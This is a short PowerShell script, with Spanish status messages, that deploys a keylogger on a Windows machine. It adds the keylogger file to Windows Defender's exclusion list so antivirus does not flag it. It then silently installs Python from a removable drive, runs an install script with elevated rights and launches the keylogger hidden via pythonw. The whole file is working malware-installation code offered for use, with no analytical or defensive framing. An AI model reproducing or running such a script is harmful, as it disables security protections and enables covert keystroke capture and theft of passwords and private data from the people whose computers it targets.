# Puts the keylogger on Windows Denfeder no check list (That way it dosen't pop up the anti-virus")

Add-MpPreference -ExclusionPath F:\keylogger_mejorado.pyw

# Path to the installer of Python
$pythonInstaller = "F:\python-3.11.6-amd64.exe"

# Install Python
Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1" -Wait

# Check of python installed
if (Test-Path "C:\Program Files\Python311") {
    Write-Host "Python311 se ha instalado correctamente."
} else {
    Write-Host "Hubo un problema durante la instalación de Python."
}

Start-Sleep -Seconds 20



#Executates the Keylogger
Start-Process -FilePath "C:\Program Files\Python311\python.exe" -ArgumentList "F:\install.py" -Verb RunAs

if ($?) {
    Write-Host "El python se ejecutó correctamente."
} else {
    Write-Host "Hubo un error al ejecutar el comando."
}

Start-Sleep -Seconds 60

#Executates the Keylogger
Start-Process -FilePath "C:\Program Files\Python311\pythonw.exe" -ArgumentList "F:\keylogger_mejorado.pyw" -Verb RunAs

if ($?) {
    Write-Host "El python se ejecutó correctamente."
} else {
    Write-Host "Hubo un error al ejecutar el comando."
}

Start-Sleep -Seconds 20

exit
